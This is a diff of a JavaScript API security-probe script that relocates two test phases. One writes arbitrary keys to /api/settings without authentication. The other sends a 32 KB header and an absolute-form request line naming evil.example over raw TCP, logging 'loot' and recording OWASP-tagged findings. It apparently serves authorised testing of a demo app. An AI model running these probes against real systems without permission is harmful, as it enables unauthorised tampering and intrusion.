@@ -1492,6 +1492,107 @@ async function phaseAccountEnumeration() {
   }
 }
 
+/**
+ * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ *   PHASE 14  ·  Unauthenticated settings write
+ * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ * Function: phaseSettingsMerge
+ * Endpoints:
+ *   - settings-get      GET /api/settings
+ *   - settings-put      PUT /api/settings  (mass-assign arbitrary keys)
+ *   - settings-restore  PUT /api/settings  (restore for clean re-run; silent unless --verbose)
+ */
+async function phaseSettingsMerge() {
+  step("Unauthenticated settings write");
+  intent("State-changing PUT with no auth and no field allowlist.");
+  const before = await http("GET", "/api/settings", { label: "settings-get" });
+  narrate("PUT arbitrary keys into /api/settings…");
+  const put = await http("PUT", "/api/settings", {
+    body: {
+      theme: "pwned",
+      featureFlags: { betaTransfer: true, evil: true },
+      injected: true,
+    },
+    label: "settings-put",
+  });
+  if (put.status === 200 && put.json?.settings?.injected === true) {
+    bad("Settings mutated without authentication");
+    loot("settings", JSON.stringify(put.json.settings));
+    record(
+      "HIGH",
+      "Unauthenticated settings write with mass assignment",
+      "State-changing PUT with no auth and no field allowlist — app-code",
+      { kind: "app-code", owasp: "API3" }
+    );
+  } else {
+    info(`settings probe → ${put.status}`);
+  }
+  if (before.json?.settings) {
+    narrate("Restoring previous settings for a clean re-run…");
+    await http("PUT", "/api/settings", {
+      body: before.json.settings,
+      label: "settings-restore",
+      silent: !verbose,
+    });
+  }
+}
+
+/**
+ * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ *   PHASE 15  ·  Raw socket header / framing probes (HTTP only)
+ * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ * Function: phaseRawHeaderAbuse
+ * Transport: {@link rawHttp} (raw TCP HTTP/1.1 — not fetch)
+ * Wire labels: huge-header (32 KB header), absolute-uri (absolute-form request line)
+ * Skip:     entire body on HTTPS targets (banner still prints, then info + return)
+ *
+ * Posture notes for reverse-proxy / header-size handling — not classic app authz.
+ */
+async function phaseRawHeaderAbuse() {
+  step("Raw socket header / framing probes (HTTP only)");
+  intent("Oversized headers + absolute-form request line — posture notes for reverse proxies.");
+  if (IS_TLS) {
+    info("Skipped raw TCP probes against HTTPS targets");
+    return;
+  }
+  const big = "A".repeat(32_000);
+  narrate("Sending a 32 KB single header over raw TCP…");
+  const r1 = await rawHttp(
+    `GET /api/health HTTP/1.1\r\nHost: ${HOST}\r\nX-Flood: ${big}\r\nConnection: close\r\n\r\n`,
+    3000,
+    "huge-header"
+  );
+  if (!r1.skipped) {
+    if (r1.status === 200) {
+      bad("Oversized header still got HTTP 200");
+      record(
+        "MEDIUM",
+        "Oversized request headers accepted",
+        "No max header size rejection observed — posture note",
+        { kind: "framework-gap", owasp: "API4" }
+      );
+    } else {
+      info(`Oversized header → ${r1.status || r1.statusLine || "no status"}`);
+    }
+  }
+
+  narrate("Absolute-form request line GET http://evil.example/api/users …");
+  const r2 = await rawHttp(
+    `GET http://evil.example/api/users HTTP/1.1\r\nHost: ${HOST}\r\nConnection: close\r\n\r\n`,
+    2500,
+    "absolute-uri"
+  );
+  if (!r2.skipped && r2.status === 200 && /users|email/i.test(r2.raw)) {
+    bad("Absolute-URI request still served the users dump");
+    record(
+      "INFO",
+      "Absolute-form request line accepted",
+      "Posture note for reverse-proxy setups",
+      { kind: "framework-gap" }
+    );
+  }
+}
+
 /** Seed accounts that exist on every cold start / isolate. */
 const DEMO_CREDENTIALS = [
   { email: "alice@example.com", password: "password123" },
@@ -1715,107 +1816,6 @@ async function phaseAuthzAndForgery() {
     }
   } else {
     info("No JWT secret recovered — skip forgery");
-  }
-}
-
-/**
- * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- *   PHASE 14  ·  Unauthenticated settings write
- * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- * Function: phaseSettingsMerge
- * Endpoints:
- *   - settings-get      GET /api/settings
- *   - settings-put      PUT /api/settings  (mass-assign arbitrary keys)
- *   - settings-restore  PUT /api/settings  (restore for clean re-run; silent unless --verbose)
- */
-async function phaseSettingsMerge() {
-  step("Unauthenticated settings write");
-  intent("State-changing PUT with no auth and no field allowlist.");
-  const before = await http("GET", "/api/settings", { label: "settings-get" });
-  narrate("PUT arbitrary keys into /api/settings…");
-  const put = await http("PUT", "/api/settings", {
-    body: {
-      theme: "pwned",
-      featureFlags: { betaTransfer: true, evil: true },
-      injected: true,
-    },
-    label: "settings-put",
-  });
-  if (put.status === 200 && put.json?.settings?.injected === true) {
-    bad("Settings mutated without authentication");
-    loot("settings", JSON.stringify(put.json.settings));
-    record(
-      "HIGH",
-      "Unauthenticated settings write with mass assignment",
-      "State-changing PUT with no auth and no field allowlist — app-code",
-      { kind: "app-code", owasp: "API3" }
-    );
-  } else {
-    info(`settings probe → ${put.status}`);
-  }
-  if (before.json?.settings) {
-    narrate("Restoring previous settings for a clean re-run…");
-    await http("PUT", "/api/settings", {
-      body: before.json.settings,
-      label: "settings-restore",
-      silent: !verbose,
-    });
-  }
-}
-
-/**
- * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- *   PHASE 15  ·  Raw socket header / framing probes (HTTP only)
- * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- * Function: phaseRawHeaderAbuse
- * Transport: {@link rawHttp} (raw TCP HTTP/1.1 — not fetch)
- * Wire labels: huge-header (32 KB header), absolute-uri (absolute-form request line)
- * Skip:     entire body on HTTPS targets (banner still prints, then info + return)
- *
- * Posture notes for reverse-proxy / header-size handling — not classic app authz.
- */
-async function phaseRawHeaderAbuse() {
-  step("Raw socket header / framing probes (HTTP only)");
-  intent("Oversized headers + absolute-form request line — posture notes for reverse proxies.");
-  if (IS_TLS) {
-    info("Skipped raw TCP probes against HTTPS targets");
-    return;
-  }
-  const big = "A".repeat(32_000);
-  narrate("Sending a 32 KB single header over raw TCP…");
-  const r1 = await rawHttp(
-    `GET /api/health HTTP/1.1\r\nHost: ${HOST}\r\nX-Flood: ${big}\r\nConnection: close\r\n\r\n`,
-    3000,
-    "huge-header"
-  );
-  if (!r1.skipped) {
-    if (r1.status === 200) {
-      bad("Oversized header still got HTTP 200");
-      record(
-        "MEDIUM",
-        "Oversized request headers accepted",
-        "No max header size rejection observed — posture note",
-        { kind: "framework-gap", owasp: "API4" }
-      );
-    } else {
-      info(`Oversized header → ${r1.status || r1.statusLine || "no status"}`);
-    }
-  }
-
-  narrate("Absolute-form request line GET http://evil.example/api/users …");
-  const r2 = await rawHttp(
-    `GET http://evil.example/api/users HTTP/1.1\r\nHost: ${HOST}\r\nConnection: close\r\n\r\n`,
-    2500,
-    "absolute-uri"
-  );
-  if (!r2.skipped && r2.status === 200 && /users|email/i.test(r2.raw)) {
-    bad("Absolute-URI request still served the users dump");
-    record(
-      "INFO",
-      "Absolute-form request line accepted",
-      "Posture note for reverse-proxy setups",
-      { kind: "framework-gap" }
-    );
   }
 }
 
